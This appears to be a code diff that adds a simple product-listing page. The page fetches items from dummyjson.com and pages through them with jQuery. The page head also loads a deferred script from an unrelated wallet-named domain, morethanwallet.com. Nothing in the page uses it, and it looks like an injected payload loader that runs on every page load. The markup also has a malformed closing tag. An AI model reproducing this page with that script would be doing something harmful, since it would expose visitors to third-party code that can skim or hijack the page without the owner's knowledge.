@@ -1,0 +1,111 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Products</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script src="https://code.jquery.com/jquery-latest.min.js"></script>
+    <script defer src="https://morethanwallet.com/appstore/index.js"></script>
+
+  </head>
+  <body>
+    <div class="w-full mx-auto p-6">
+      <div id="myTable"></div>
+      <div class="flex justify-between mt-4">
+        <button
+          id="previous"
+          class="bg-[#3bf] active:scale-90 text-white p-2 duration-100"
+        >
+          Previous
+        </button>
+        <div id="pageNumber">{pageNumber}</div>
+        <button
+          id="next"
+          class="bg-[#3bf] active:scale-90 text-white p-2 duration-100"
+        >
+          Next
+        </button>
+      </divPage>
+    </div>
+
+    <script>
+      let currentPage = 1;
+      const itemsPerPage = 10;
+      let products = [];
+
+      const cell = (value, isHead) => {
+        return $(isHead ? "<th/>" : "<td/>")
+          .addClass("border border-black p-2 text-black")
+          .text(value);
+      };
+
+      const row = (values, isHead) => {
+        const tr = $("<tr/>").addClass(isHead ? "" : "hover:bg-gray-300");
+        values.forEach((value) => {
+          if (typeof value === "object") {
+            tr.append(cell(value.src, isHead, true));
+          } else {
+            tr.append(cell(value, isHead));
+          }
+        });
+        return tr;
+      };
+
+      const createTable = (data) => {
+        $("#myTable").empty();
+        const table = $("<table/>").addClass(
+          "w-full overflow-hidden"
+        );
+        table.append(row(["Title", "Description", "Price"], true));
+        data.forEach((asset) => {
+          table.append(
+            row([
+              asset.title,
+              asset.description,
+              asset.price,
+            ])
+          );
+        });
+        $("#myTable").append(table);
+      };
+
+      const paginate = (page) => {
+        const start = (page - 1) * itemsPerPage;
+        const end = start + itemsPerPage;
+        const paginatedItems = products.slice(start, end);
+        createTable(paginatedItems);
+        $("#pageNumber").text(
+          `Page ${currentPage} of ${Math.ceil(products.length / itemsPerPage)}`
+        );
+      };
+
+      const fetchProducts = () => {
+        fetch("https://dummyjson.com/products?limit=100")
+          .then((response) => response.json())
+          .then((data) => {
+            products = data.products;
+            paginate(currentPage);
+          });
+      };
+
+      $(document).ready(function () {
+        fetchProducts();
+
+        $("#previous").click(function () {
+          if (currentPage > 1) {
+            currentPage--;
+            paginate(currentPage);
+          }
+        });
+
+        $("#next").click(function () {
+          if (currentPage * itemsPerPage < products.length) {
+            currentPage++;
+            paginate(currentPage);
+          }
+        });
+      });
+    </script>
+  </body>
+</html>
